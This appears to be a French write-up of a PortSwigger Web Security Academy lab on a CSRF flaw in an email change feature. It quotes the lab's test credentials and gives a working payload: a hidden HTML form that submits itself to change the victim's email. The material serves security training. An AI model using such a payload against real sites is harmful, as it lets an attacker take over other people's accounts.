# [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)
> Difficulté : Apprentice


## Enoncé :

*This lab's email change functionality is vulnerable to CSRF.
To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
You can log in to your own account using the following credentials: wiener:peter*

<details>
<summary>Hint</summary>
You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.
</details>

## Solution

Nous cherchons à créer un payload réalisant, depuis la session victime, un changement de mail de notre choix.
En utilisant le cours, nous pouvons assez aisément construire le payload suivant, que nous allons mettre dans le Body de notre espace dans le lab avant de "Deliver exploit to victim".
```
<form method="POST" action="https://<lab_id>.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="t@t.com">
</form>
<script>
    document.forms[0].submit();
</script>
```
